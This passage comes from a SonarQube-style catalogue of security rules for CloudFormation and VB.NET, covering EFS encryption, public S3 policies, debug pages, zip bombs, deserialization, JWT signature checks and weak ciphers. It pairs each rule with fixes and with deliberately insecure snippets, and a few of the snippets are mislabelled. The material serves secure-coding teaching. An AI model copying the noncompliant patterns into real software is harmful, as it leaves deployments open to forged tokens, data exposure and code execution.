<p>It’s recommended to encrypt EFS file systems that contain sensitive information. Encryption and decryption are handled transparently by EFS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-efs-filesystem.html" rel="nofollow">AWS::EFS::FileSystem</a>:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  Fs:  # Sensitive, encryption disabled by default
    Type: AWS::EFS::FileSystem
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-efs-filesystem.html" rel="nofollow">AWS::EFS::FileSystem</a>:</p>
<pre>
AWSTemplateFormatVersion: &#39;2010-09-09&#39;
Resources:
  Fs:
    Type: AWS::EFS::FileSystem
    Properties:
      Encrypted: true
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/efs/latest/ug/encryption.html" rel="nofollow">AWS Documentation</a> - Data encryption in Amazon EFS </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6270">
              cloudformation:S6270
            </a>
          </td>
          <td>
            <details>
              <p>Resource-based policies granting access to all users can lead to information leakage.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The AWS resource stores or processes sensitive data. </li><li> The AWS resource is designed to be private. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege principle, i.e. to grant necessary permissions only to users for their required tasks. In the
context of resource-based policies, list the principals that need the access and grant to them only the required privileges.</p>
<h2>Sensitive Code Example</h2>
<p>This policy allows all users, including anonymous ones, to access an S3 bucket:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3BucketPolicy:
    Type: &#39;AWS::S3::BucketPolicy&#39; # Sensitive
    Properties:
      Bucket: !Ref S3Bucket
      PolicyDocument:
        Version: &#34;2012-10-17&#34;
        Statement:
          - Effect: Allow
            Principal:
              AWS: &#34;*&#34; # all principals / anonymous access
            Action: &#34;s3:PutObject&#34; # can put object
            Resource: arn:aws:s3:::mybucket/*
</pre>
<h2>Compliant Solution</h2>
<p>This policy allows only the authorized users:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3BucketPolicy:
    Type: &#39;AWS::S3::BucketPolicy&#39; # Compliant
    Properties:
      Bucket: !Ref S3Bucket
      PolicyDocument:
        Version: &#34;2012-10-17&#34;
        Statement:
          - Effect: Allow
            Principal:
              AWS:
                - !Sub &#39;arn:aws:iam::${AWS::AccountId}:root&#39; # only this principal
            Action: &#34;s3:PutObject&#34; # can put object
            Resource: arn:aws:s3:::mybucket/*
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S4507">
              vbnet:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li><li> The application runs by default with debug features activated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers.</p>
<p>The .Net Core framework offers multiple features which help during debug.
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code> and
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code> are two of them. Make sure that those features are disabled in
production.</p>
<p>Use <code>If env.IsDevelopment()</code> to disable debug code.</p>
<h2>Sensitive Code Example</h2>
<p>This rule raises issues when the following .Net Core methods are called:
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDeveloperExceptionPage</code>,
<code>Microsoft.AspNetCore.Builder.IApplicationBuilder.UseDatabaseErrorPage</code>.</p>
<pre>
Imports Microsoft.AspNetCore.Builder
Imports Microsoft.AspNetCore.Hosting

Namespace MyMvcApp
    Public Class Startup
        Public Sub Configure(ByVal app As IApplicationBuilder, ByVal env As IHostingEnvironment)
            &#39; Those calls are Sensitive because it seems that they will run in production
            app.UseDeveloperExceptionPage() &#39;Sensitive
            app.UseDatabaseErrorPage() &#39;Sensitive
        End Sub
    End Class
End Namespace
</pre>
<h2>Compliant Solution</h2>
<pre>
Imports Microsoft.AspNetCore.Builder
Imports Microsoft.AspNetCore.Hosting

Namespace MyMvcApp
    Public Class Startup
        Public Sub Configure(ByVal app As IApplicationBuilder, ByVal env As IHostingEnvironment)
            If env.IsDevelopment() Then &#39; Compliant
                &#39; The following calls are ok because they are disabled in production
                app.UseDeveloperExceptionPage()
                app.UseDatabaseErrorPage()
            End If
        End Sub
    End Class
End Namespace
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li><li> <a href="https://cwe.mitre.org/data/definitions/215" rel="nofollow">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5042">
              vbnet:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio" rel="nofollow">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul><li> There is no validation of the number of entries in the archive. </li><li> There is no validation of the total size of the uncompressed data. </li><li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li><li> Define and control the threshold for maximum total size of the uncompressed data. </li><li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
For Each entry As ZipArchiveEntry in archive.Entries
    &#39; entry.FullName could contain parent directory references &#34;..&#34; and the destinationPath variable could become outside of the desired path
    string destinationPath &#61; Path.GetFullPath(Path.Combine(path, entry.FullName))
    entry.ExtractToFile(destinationPath) &#39; Sensitive, extracts the entry to a file

    Dim stream As Stream
    stream &#61; entry.Open() &#39; Sensitive, the entry is about to be extracted
Next
</pre>
<h2>Compliant Solution</h2>
<pre>
Const ThresholdRatio As Double &#61; 10
Const ThresholdSize As Integer &#61; 1024 * 1024 * 1024 &#39; 1 GB
Const ThresholdEntries As Integer &#61; 10000
Dim TotalSizeArchive, TotalEntryArchive, TotalEntrySize, Cnt As Integer
Dim Buffer(1023) As Byte
Using ZipToOpen As New FileStream(&#34;ZipBomb.zip&#34;, FileMode.Open), Archive As New ZipArchive(ZipToOpen, ZipArchiveMode.Read)
    For Each Entry As ZipArchiveEntry In Archive.Entries
        Using s As Stream &#61; Entry.Open
            TotalEntryArchive &#43;&#61; 1
            TotalEntrySize &#61; 0
            Do
                Cnt &#61; s.Read(Buffer, 0, Buffer.Length)
                TotalEntrySize &#43;&#61; Cnt
                TotalSizeArchive &#43;&#61; Cnt
                If TotalEntrySize / Entry.CompressedLength &gt; ThresholdRatio Then Exit Do    &#39; Ratio between compressed And uncompressed data Is highly suspicious, looks Like a Zip Bomb Attack
            Loop While Cnt &gt; 0
        End Using
        If TotalSizeArchive &gt; ThresholdSize Then Exit For       &#39; The uncompressed data size Is too much for the application resource capacity
        If TotalEntryArchive &gt; ThresholdEntries Then Exit For   &#39; Too much entries in this archive, can lead to inodes exhaustion of the system
    Next
End Using
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> -
  Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/409" rel="nofollow">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li><li> <a href="https://www.bamsoftware.com/hacks/zipbomb/" rel="nofollow">bamsoftware.com</a> - A better Zip Bomb </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5773">
              vbnet:S5773
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>During the deserialization process, the state of an object will be reconstructed from the serialized data stream which can contain dangerous
operations.</p>
<p>For example, a well-known attack vector consists in serializing an object of type <code><a href="https://docs.microsoft.com/en-us/dotnet/api/system.codedom.compiler.tempfilecollection.-ctor?view&#61;netframework-4.8#System_CodeDom_Compiler_TempFileCollection__ctor" rel="nofollow">TempFileCollection</a></code>
with arbitrary files (defined by an attacker) which will be deleted on the application deserializing this object (when the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.codedom.compiler.tempfilecollection.finalize?view&#61;netframework-4.8" rel="nofollow">finalize() </a>method of
the TempFileCollection object is called). This kind of types are called &#34;<a href="https://github.com/pwntester/ysoserial.net" rel="nofollow">gadgets</a>&#34;.</p>
<p>Instead of using <code>BinaryFormatter</code> and similar serializers, it is recommended to use safer alternatives in most of the cases, such as <a href="https://docs.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view&#61;net-5.0" rel="nofollow">XmlSerializer</a> or <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.datacontractserializer?view&#61;net-5.0" rel="nofollow">DataContractSerializer</a>. If
it’s not possible then try to mitigate the risk by restricting the types allowed to be deserialized:</p>
<ul><li> by implementing an &#34;allow-list&#34; of types, but keep in mind that novel dangerous types are regularly discovered and this protection could be
  insufficient over time. </li><li> or/and implementing a tamper protection, such as <a href="https://en.wikipedia.org/wiki/HMAC" rel="nofollow">message authentication codes</a> (MAC). This way
  only objects serialized with the correct MAC hash will be deserialized. </li></ul>
<h3>Noncompliant code example</h3>
<p>For <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view&#61;netframework-4.8" rel="nofollow">BinaryFormatter</a>,
<a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer?view&#61;netframework-4.8" rel="nofollow">NetDataContractSerializer</a>,
<a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter?view&#61;netframework-4.8" rel="nofollow">SoapFormatter</a>
serializers:</p>
<pre>
Dim myBinaryFormatter &#61; New BinaryFormatter()
myBinaryFormatter.Deserialize(stream) &#39; Noncompliant: a binder is not used to limit types during deserialization
</pre>
<p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer?view&#61;netframework-4.8" rel="nofollow">JavaScriptSerializer</a>
should not use SimpleTypeResolver or other weak resolvers:</p>
<pre>
Dim serializer1 As JavaScriptSerializer &#61; New JavaScriptSerializer(New SimpleTypeResolver()) &#39; Noncompliant: SimpleTypeResolver is unsecure (every types is resolved)
serializer1.Deserialize(Of ExpectedType)(json)
</pre>
<p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.losformatter?view&#61;netframework-4.8" rel="nofollow">LosFormatter</a> should not be used without
MAC verification:</p>
<pre>
Dim formatter As LosFormatter &#61; New LosFormatter() &#39; Noncompliant
formatter.Deserialize(fs)
</pre>
<h3>Compliant solution</h3>
<p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter?view&#61;netframework-4.8" rel="nofollow">BinaryFormatter</a>,
<a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer?view&#61;netframework-4.8" rel="nofollow">NetDataContractSerializer
</a>, <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter?view&#61;netframework-4.8" rel="nofollow">SoapFormatter</a>
serializers should use a binder implementing a whitelist approach to limit types during deserialization (at least one exception should be thrown or a
null value returned):</p>
<pre>
NotInheritable Class CustomBinder
    Inherits SerializationBinder
    Public Overrides Function BindToType(assemblyName As String, typeName As String) As Type
        If Not (Equals(typeName, &#34;type1&#34;) OrElse Equals(typeName, &#34;type2&#34;) OrElse Equals(typeName, &#34;type3&#34;)) Then
            Throw New SerializationException(&#34;Only type1, type2 and type3 are allowed&#34;) &#39; Compliant
        End If
        Return Assembly.Load(assemblyName).[GetType](typeName)
    End Function
End Class

Dim myBinaryFormatter &#61; New BinaryFormatter()
myBinaryFormatter.Binder &#61; New CustomBinder()
myBinaryFormatter.Deserialize(stream)
</pre>
<p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer?view&#61;netframework-4.8" rel="nofollow">JavaScriptSerializer</a>
should use a resolver implementing a whitelist to limit types during deserialization (at least one exception should be thrown or a null value
returned):</p>
<pre>
Public Class CustomSafeTypeResolver
    Inherits JavaScriptTypeResolver
    Public Overrides Function ResolveType(id As String) As Type
        If Not Equals(id, &#34;ExpectedType&#34;) Then
            Throw New ArgumentNullException(&#34;Only ExpectedType is allowed during deserialization&#34;) &#39; Compliant
        End If
        Return Type.[GetType](id)
    End Function
End Class

Dim serializer As JavaScriptSerializer &#61; New JavaScriptSerializer(New CustomSafeTypeResolver()) &#39; Compliant
serializer.Deserialize(Of ExpectedType)(json)
</pre>
<p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.losformatter?view&#61;netframework-4.8" rel="nofollow">LosFormatter</a> serializer with MAC
verification:</p>
<pre>
Dim formatter As LosFormatter &#61; New LosFormatter(True, secret) &#39; Compliant
formatter.Deserialize(fs)
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide?s&#61;03" rel="nofollow">docs.microsoft.com</a> -
  BinaryFormatter security guide </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization" rel="nofollow">OWASP Top 10 2017 Category A8</a> - Insecure
  Deserialization </li><li> <a href="https://cwe.mitre.org/data/definitions/134" rel="nofollow">MITRE, CWE-134</a> - Use of Externally-Controlled Format String </li><li> <a href="https://cwe.mitre.org/data/definitions/502" rel="nofollow">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li><li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Deserialization_Cheat_Sheet.md" rel="nofollow">OWASP Deserialization Cheat
  Sheet</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5659">
              vbnet:S5659
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>
<h2>Why is this an issue?</h2>
<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security
risk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This
vulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT
hinges on the strength and presence of its signature.</p>
<h3>What is the potential impact?</h3>
<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant
threat to data security and the privacy of user identities.</p>
<h4>Impersonation of users</h4>
<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.
When these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to
craft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level
permissions and sensitive data.</p>
<h4>Unauthorized data access</h4>
<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker
can manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>
<h2>How to fix it in Jwt.Net</h2>
<h3>Code examples</h3>
<p>The following code contains examples of JWT encoding and decoding without a strong cipher algorithm.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
Imports JWT

Public Sub Decode(decoder AS IJwtDecoder)
    Dim decoded As String &#61; decoder.Decode(token, secret, verify:&#61; false) &#39; Noncompliant
End Sub
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
Imports JWT

Public Sub Decode()
    Dim decoded As String &#61; new JwtBuilder()
        .WithSecret(secret)
        .Decode(token) &#39; Noncompliant
End Sub
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
Imports JWT

Public Sub Decode(decoder AS IJwtDecoder)
    Dim decoded As String &#61; decoder.Decode(token, secret, verify:&#61; true)
End Sub
</pre>
<p>When using <code>JwtBuilder</code>, make sure to call <code>MustVerifySignature()</code>.</p>
<pre data-diff-id="2" data-diff-type="compliant">
Imports JWT

Public Sub Decode()
    Dim decoded As String &#61; new JwtBuilder()
        .WithSecret(secret)
        .MustVerifySignature()
        .Decode(token)
End Sub
</pre>
<h3>How does this work?</h3>
<h4>Verify the signature of your tokens</h4>
<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:
validating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating
signatures, they are not serving their purpose.</p>
<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding
process that the signature of the JWT should also be checked.</p>
<p>To resolve the issue follow these instructions:</p>
<ol><li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not
  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li><li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating
  potential tampering. The action to take on encountering an invalid token should be denying the request carrying it and logging the event for further
  investigation. </li><li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature
  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li></ol>
<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on
tampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>
<h3>Going the extra mile</h3>
<h4>Securely store your secret keys</h4>
<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control
system. Instead, consider using environment variables, secure key management systems, or vault services.</p>
<h4>Rotate your secret keys</h4>
<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to
periodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be
sure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/347" rel="nofollow">MITRE, CWE-347</a> - Improper Verification of Cryptographic Signature </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5547">
              vbnet:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection. </li><li> Security during transmission or on storage devices. </li><li> Data integrity, general trust, and authentication. </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
Imports System.Security.Cryptography

Public Sub Encrypt()
    Dim SimpleDES As New DESCryptoServiceProvider() &#39; Noncompliant
End Sub
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
Imports System.Security.Cryptography

Public Sub Encrypt()
    Dim AES128ECB &#61; Aes.Create()
End Sub
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5542">
              vbnet:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest modes are CBC (Cipher Block Chaining) and ECB</p>
<p>(Electronic Codebook), as they are either vulnerable to padding oracles or do not provide authentication mechanisms.</p>
<p>And for RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
Imports System.Security.Cryptography

Public Module Example

    Public Sub Encrypt()
        Dim Algorithm As New AesManaged() With {
            .KeySize &#61; 128,
            .BlockSize &#61; 128,
            .Mode &#61; CipherMode.ECB, &#39; Noncompliant
            .Padding &#61; PaddingMode.PKCS7
            }
    End Sub
End Module
</pre>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
Imports System.Security.Cryptography

Public Module Example

    Public Sub Encrypt()
        Dim data(10) As Byte
        Dim RsaCsp &#61; New RSACryptoServiceProvider()
        RsaCsp.Encrypt(data, False) &#39; Noncompliant
    End Sub
End Module
</pre>
<h4>Compliant solution</h4>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
Imports System.Security.Cryptography

Public Module Example

    Public Sub Encrypt()
        Dim data(10) As Byte
        Dim Algorithm As New AesGcm(data)
    End Sub
End Module
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
Imports System.Security.Cryptography

Public Module Example

    Public Sub Encrypt()
        Dim data(10) As Byte
        Dim RsaCsp &#61; New RSACryptoServiceProvider()
        RsaCsp.Encrypt(data, True) &#39; Noncompliant
    End Sub
End Module
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: Use Galois/Counter mode (GCM)</h4>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul><li> CCM: <code>Counter with CBC-MAC</code> </li><li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li><li> EAX: <code>Encrypt-and-Authenticate</code> </li><li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li><li> OCB: <code>Offset Codebook Mode</code> </li></ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it</p>
<p>is considered more straightforward to use AES-GCM directly instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
